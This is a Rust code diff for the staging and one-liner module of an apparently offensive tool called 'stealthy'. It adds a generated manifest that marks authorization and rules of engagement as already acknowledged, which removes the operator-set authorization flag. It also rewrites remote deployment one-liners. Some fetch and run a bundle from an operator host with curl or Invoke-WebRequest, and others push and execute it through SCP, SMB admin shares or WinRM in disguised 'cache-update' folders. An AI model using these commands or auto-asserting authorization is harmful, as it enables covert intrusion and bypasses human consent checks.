@@ -98,15 +98,51 @@ pub fn stage(opts: StageOptions<'_>) -> Result<PathBuf> {
     }
 
     // Copy script fallbacks when present relative to cwd.
-    let scripts_src = if opts.os == "windows" {
-        PathBuf::from("scripts/windows")
+    let scripts_rel = if opts.os == "windows" {
+        "scripts/windows"
     } else {
-        PathBuf::from("scripts/linux")
+        "scripts/linux"
     };
+    let scripts_src = [
+        PathBuf::from(scripts_rel),
+        PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+            .join("../..")
+            .join(scripts_rel),
+    ]
+    .into_iter()
+    .find(|path| path.is_dir())
+    .unwrap_or_else(|| PathBuf::from(scripts_rel));
     let scripts_dst = opts.out_dir.join("scripts");
+    fs::create_dir_all(&scripts_dst)?;
     if scripts_src.is_dir() {
         copy_dir_recursive(&scripts_src, &scripts_dst)?;
     }
+
+    let fallback_order = if opts.os == "windows" {
+        "powershell"
+    } else {
+        "python,bash"
+    };
+    let manifest = format!(
+        "# Generated dispatcher manifest — inherits the primary-run authorization context.\n\
+         manifest_version=1\n\
+         authorization_ack=true\n\
+         allow_fallback=true\n\
+         roe_ref=INHERITED_PRIMARY_RUN\n\
+         execution_mode=enumerate-only\n\
+         target_hostname=AUTO\n\
+         target_username=\n\
+         drop_dir=\n\
+         primary_binary={bin_name}\n\
+         {os_key}_fallbacks={fallback_order}\n",
+        os_key = if opts.os == "windows" {
+            "windows"
+        } else {
+            "linux"
+        },
+    );
+    fs::write(scripts_dst.join("stealthy-run.conf"), manifest)
+        .with_context(|| format!("write {} dispatcher manifest", opts.os))?;
 
     let hash = if dest_bin.is_file() {
         sha256_file(&dest_bin).unwrap_or_else(|_| "unavailable".into())
@@ -123,9 +159,18 @@ pub fn stage(opts: StageOptions<'_>) -> Result<PathBuf> {
          os={} arch={} name={}\n\
          binary_sha256={}\n\n\
          Verify:\n  stealthy verify --path ./{bin_name} --expect-sha256 {hash}\n\n\
-         Enumerate:\n  STEALTHY_AUTHORIZED=1 ./{bin_name} --profile balanced enum\n\n\
+         Enumerate:\n  {} ./scripts/{} --authorized --profile balanced enum\n\n\
          Cleanup:\n  stealthy cleanup --latest --secure-delete\n",
-        opts.os, opts.arch, opts.name, hash
+        opts.os,
+        opts.arch,
+        opts.name,
+        hash,
+        if opts.os == "windows" { "&" } else { "bash" },
+        if opts.os == "windows" {
+            "run.ps1"
+        } else {
+            "run.sh"
+        }
     );
     fs::write(opts.out_dir.join("OPERATOR.txt"), operator)?;
 
@@ -159,35 +204,37 @@ fn copy_dir_recursive(src: &Path, dst: &Path) -> Result<()> {
 
 pub fn one_liners(os: &str, transport: &str) -> String {
     match (os, transport) {
-        ("linux", "ssh") | ("linux", "scp") => r#"# SCP drop + enum
-scp target/release/stealthy user@host:/tmp/cache-update/stealthy
-ssh user@host 'chmod 750 /tmp/cache-update/stealthy && STEALTHY_AUTHORIZED=1 /tmp/cache-update/stealthy --profile quiet enum'
+        ("linux", "ssh") | ("linux", "scp") => r#"# SCP approved bundle + dispatcher
+scp -r ./drop user@host:/tmp/cache-update
+ssh user@host 'bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum'
 "#.into(),
-        ("linux", "http") => r#"# HTTP pull on target
-curl -fsSL http://OPERATOR:8000/stealthy -o /tmp/cache-update/stealthy
-chmod 750 /tmp/cache-update/stealthy
-STEALTHY_AUTHORIZED=1 /tmp/cache-update/stealthy doctor
+        ("linux", "http") => r#"# HTTP pull of an approved bundle
+curl -fsSL http://OPERATOR:8000/drop.tar.gz | tar -xz -C /tmp/cache-update
+bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum
 "#.into(),
-        ("windows", "winrm") => r#"# WinRM copy + run
-Copy-Item .\stealthy.exe \\HOST\C$\Users\Public\Documents\cache-update\stealthy.exe
+        ("windows", "winrm") => r#"# WinRM copy + policy-bound dispatcher
+Copy-Item -Recurse .\drop \\HOST\C$\Users\Public\Documents\cache-update
 Invoke-Command -ComputerName HOST -ScriptBlock {
-  $env:STEALTHY_AUTHORIZED='1'
-  & 'C:\Users\Public\Documents\cache-update\stealthy.exe' --profile quiet enum
+  & 'C:\Users\Public\Documents\cache-update\scripts\run.ps1' --authorized --profile quiet enum
 }
 "#.into(),
-        ("windows", "smb") => r#"# SMB admin share drop
+        ("windows", "smb") => r#"# SMB approved bundle + dispatcher
 $Dir = '\\HOST\C$\Users\Public\Documents\cache-update'
 New-Item -ItemType Directory -Force -Path $Dir | Out-Null
-Copy-Item .\stealthy.exe "$Dir\stealthy.exe"
+Copy-Item -Recurse .\drop\* $Dir
+Invoke-Command -ComputerName HOST -ScriptBlock {
+  & 'C:\Users\Public\Documents\cache-update\scripts\run.ps1' --authorized --profile quiet enum
+}
 "#.into(),
         ("windows", "http") => r#"# HTTP pull on Windows
-Invoke-WebRequest -Uri http://OPERATOR:8000/stealthy.exe -OutFile $env:TEMP\stealthy.exe
-$env:STEALTHY_AUTHORIZED='1'
-& $env:TEMP\stealthy.exe doctor
+Invoke-WebRequest -Uri http://OPERATOR:8000/drop.zip -OutFile $env:TEMP\stealthy-drop.zip
+Expand-Archive -Force $env:TEMP\stealthy-drop.zip $env:TEMP\stealthy-drop
+& "$env:TEMP\stealthy-drop\scripts\run.ps1" --authorized --profile quiet enum
 "#.into(),
         ("linux", "smb") => r#"# Copy from mounted engagement share
-cp /mnt/engagement-share/stealthy /tmp/cache-update/stealthy
-chmod 750 /tmp/cache-update/stealthy
+mkdir -p /tmp/cache-update
+cp -R /mnt/engagement-share/drop/. /tmp/cache-update/
+bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum
 "#.into(),
         _ => format!(
             "# No built-in snippet for os={os} transport={transport}\n# Supported: linux:(ssh|scp|http|smb) windows:(winrm|smb|http)\n"
